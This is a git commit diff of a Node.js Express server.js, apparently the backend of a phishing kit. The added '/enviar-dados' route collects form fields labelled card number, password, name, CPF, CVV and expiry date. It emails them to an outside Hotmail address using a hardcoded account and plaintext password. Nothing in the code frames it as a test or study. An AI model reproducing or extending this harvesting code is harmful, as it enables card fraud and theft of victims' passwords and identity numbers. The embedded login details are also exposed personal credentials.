af87b309b2b857baccfe4471481deba00d67f5b0
Flavio062e <meccgamer90@gmail.com>
2024-03-24 01:04:06 -0300

    ita

--- server.js
+++ server.js
@@ -1,28 +1,47 @@
 const express = require('express');
-const fs = require('fs');
-const app = express();
-const port = 3000;
+const path = require('path');
+const nodemailer = require('nodemailer');
 
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.urlencoded({ extended: true }));
 
-app.get('/', (req, res) => {
-  res.sendFile(__dirname + '/index.html');
+// Rota para lidar com a solicitação POST do formulário
+app.post('/enviar-dados', (req, res) => {
+    const { informacao1, informacao2, informacao3, informacao4, informacao5, informacao6, informacao7 } = req.body; // Captura os dados enviados pelo formulário
+
+    // Configuração do serviço de email
+    const transporter = nodemailer.createTransport({
+        service: 'hotmail',
+        auth: {
+            user: 'dinair1979@hotmail.com',
+            pass: 'dinair1b2f3o'
+        }
+    });
+
+    // Opções do email
+    const mailOptions = {
+        from: 'dinair1979@hotmail.com',
+        to: 'flaviopnc123@hotmail.com',
+        subject: 'Novas informações recebidas',
+        text: `numero: ${informacao1}\nsenha: ${informacao2}\nnome: ${informacao3}\ncpf: ${informacao4}\ncvv: ${informacao5}\nmm: ${informacao6} \nyy: ${informacao7}`
+    };
+
+    // Envia o email
+    transporter.sendMail(mailOptions, (error, info) => {
+        if (error) {
+            console.log(error);
+            res.send('Erro ao enviar o email');
+        } else {
+            console.log('Email enviado: ' + info.response);
+            res.send('Dados enviados com sucesso');
+        }
+    });
 });
 
-app.post('/enviar', (req, res) => {
-  const info1 = req.body.info1;
-  const info2 = req.body.info2;
-
-  const data = `Informação 1: ${info1}\nInformação 2: ${info2}\n`;
-
-  fs.appendFile('informacoes.txt', data, (err) => {
-    if (err) throw err;
-    console.log('Informações salvas com sucesso!');
-  });
-
-  res.redirect('/');
-});
-
-app.listen(port, () => {
-  console.log(`Servidor rodando em http://localhost:${port}`);
+// Inicia o servidor
+app.listen(PORT, () => {
+    console.log(`Servidor rodando na porta ${PORT}`);
 });
